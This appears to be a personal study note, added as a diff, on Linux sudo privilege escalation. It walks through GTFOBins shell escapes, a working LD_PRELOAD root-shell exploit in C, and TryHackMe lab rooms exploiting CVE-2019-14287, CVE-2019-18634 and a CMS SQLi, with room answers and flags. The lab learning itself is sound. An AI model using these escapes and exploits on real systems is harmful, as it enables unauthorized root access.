@@ -1,1 +1,260 @@
 
+### Sudo Shell Escaping
+#gtfobins [Gtfobins](https://gtfobins.github.io/#)
+
+- Find what current user can do with Sudo. 
+~~~bash
+TCM@debian:~$ sudo -l
+Matching Defaults entries for TCM on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User TCM may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+
+~~~
+
+- Go to gtfobins and copy codes
+~~~bash
+sudo vim -c ':!/bin/sh'
+~~~
+
+- Run that in the terminal of current user. 
+~~~bash
+TCM@debian:~$ sudo vim -c ':!/bin/sh'
+
+sh-4.1# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.1# 
+~~~
+
+- Rooted machine. 
+
+### Intended Functionality
+Sudo file that do not have privilege escalation in gtfobin. In that case, google that file privilege escalation and find some command related to it which will help for rooting. 
+
+### LD_PRELOAD
+
+- Create shell.c file for exploit
+~~~bash
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+~~~
+
+- Gcc compile before running script
+~~~bash
+TCM@debian:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+~~~
+
+- Run script use any one file that have sudo permission
+~~~bash
+TCM@debian:~$ sudo LD_PRELOAD=/home/user/shell.so apache2
+root@debian:/home/user# id
+uid=0(root) gid=0(root) groups=0(root)
+~~~
+- Rooted machine
+
+
+### Simple CTF - tryhackme room 
+
+1. How many services are running under port 1000? - **2**
+~~~bash
+──(kali㉿kali)-[~]
+└─$ sudo nmap 10.10.157.152
+[sudo] password for kali: 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-17 05:42 EDT
+Nmap scan report for 10.10.157.152
+Host is up (0.30s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Nmap done: 1 IP address (1 host up) scanned in 20.18 seconds
+~~~
+
+2. What is running on the higher port? - **ssh**
+~~~bash
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -A -T4 -p 2222 10.10.157.152
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-17 05:48 EDT
+Nmap scan report for 10.10.157.152
+Host is up (0.28s latency).
+
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+~~~
+
+4. What's the CVE you're using against the application? - **CVE-2019-14287**  #CVE-2019-14287
+~~~bash
+# Find the host cms using dirb
+┌──(kali㉿kali)-[~]
+└─$ python3 dirsearch/dirsearch.py -u http://10.10.157.152/ -e php,html -x 400,401,403
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                            
+ (_||| _) (/_(_|| (_| )                                                                                                                                     
+Extensions: php, html | HTTP method: GET | Threads: 25 | Wordlist size: 10073
+
+Output: /home/kali/reports/http_10.10.157.152/__23-08-17_06-06-22.txt
+
+Target: http://10.10.157.152/
+
+[06:06:22] Starting:                                                                                                                                        
+[06:08:20] 200 -  929B  - /robots.txt                                       
+[06:08:25] 301 -  315B  - /simple  ->  http://10.10.157.152/simple/              
+Task Completed   
+
+# Website application version found to be CMS Made Simple version 2.2.8
+~~~
+
+6. To what kind of vulnerability is the application vulnerable? - **SQLi**
+
+7. What's the password? - secret
+~~~bash
+# Download script from this CVE, exploit using that. 
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 46635.py -u http://10.10.157.152/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+
+# This will give hash then crack it. 
+~~~
+
+9. Where can you login with the details obtained? - **ssh**
+
+10. What's the user flag? - **G00d j0b, keep up!** 
+~~~bash
+$ whoami
+mitch
+$ ls
+user.txt
+$ cat user.txt  
+G00d j0b, keep up!
+~~~
+
+12. Is there any other user in the home directory? What's its name? - **sunbath**
+~~~bash
+$ cd /home
+$ ls
+mitch  sunbath
+~~~
+
+14. What can you leverage to spawn a privileged shell? - **vim**
+~~~bash
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+~~~
+
+16. What's the root flag? - **W3ll d0n3. You made it!**
+~~~bash
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+$ sudo vim -c ':!/bin/sh'
+
+# id     
+uid=0(root) gid=0(root) groups=0(root)
+# ls
+user.txt
+# cat user.txt
+G00d j0b, keep up!
+# cd /root
+# ls
+root.txt
+# cat root.txt
+W3ll d0n3. You made it!
+# 
+~~~
+
+### CVE-2019-14287 Overview - Sudo Security Bypass - Tryhackme
+[https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)  #CVE-2019-14287
+
+- What command are you allowed to run with sudo? - **/bin/bash**
+~~~bash
+──(kali㉿kali)-[~]
+└─$ ssh tryhackme@10.10.61.109 -p 2222
+The authenticity of host '[10.10.61.109]:2222 ([10.10.61.109]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:4bgDOPxI7PFcv5CMfQYEkO7uBqKjLKhd7zZwmE8uwbQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.61.109]:2222' (ED25519) to the list of known hosts.
+tryhackme@10.10.61.109's password: 
+Last login: Fri Feb  7 00:14:41 2020 from 192.168.1.151
+tryhackme@sudo-privesc:~$ ls
+tryhackme@sudo-privesc:~$ sudo 0l
+[sudo] password for tryhackme: 
+sudo: 0l: command not found
+tryhackme@sudo-privesc:~$ sudo -l
+Matching Defaults entries for tryhackme on sudo-privesc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tryhackme may run the following commands on sudo-privesc:
+    (ALL, !root) NOPASSWD: /bin/bash
+~~~
+
+- What is the flag in /root/root.txt? - **THM{l33t_s3cur1ty_bypass}**
+~~~bash
+tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
+root@sudo-privesc:~# id 
+uid=0(root) gid=1000(tryhackme) groups=1000(tryhackme)
+root@sudo-privesc:~# ls
+root@sudo-privesc:~# cd /root
+root@sudo-privesc:/root# ls
+root.txt
+root@sudo-privesc:/root# cat root.txt
+THM{l33t_s3cur1ty_bypass}
+~~~
+
+### CVE-2019-18634 - Sudo Buffer Overflow - Tryhackme 
+https://github.com/saleemrashid/sudo-cve-2019-18634 #CVE-2019-18634
+
+- What's the flag in /root/root.txt? - **THM{buff3r_0v3rfl0w_rul3s}**
+
+~~~bash
+tryhackme@sudo-bof:~$ sudo -l
+[sudo] password for tryhackme:          
+Sorry, user tryhackme may not run sudo on sudo-bof.
+tryhackme@sudo-bof:~$ cat /etc/suoers
+cat: /etc/suoers: No such file or directory
+tryhackme@sudo-bof:~$ cat /etc/sudoers
+cat: /etc/sudoers: Permission denied
+tryhackme@sudo-bof:~$ sudo -V 
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+tryhackme@sudo-bof:~$ cd exploit 
+-bash: cd: exploit: Not a directory
+tryhackme@sudo-bof:~$ ls
+exploit
+tryhackme@sudo-bof:~$ ./exploit 
+[sudo] password for tryhackme: 
+trySorry, try again.
+# id
+sh: 1: tryid: not found
+# id
+uid=0(root) gid=0(root) groups=0(root),1000(tryhackme)
+# ls
+exploit
+# cd /root
+# ls
+root.txt
+# cat root.txt
+THM{buff3r_0v3rfl0w_rul3s}
+~~~
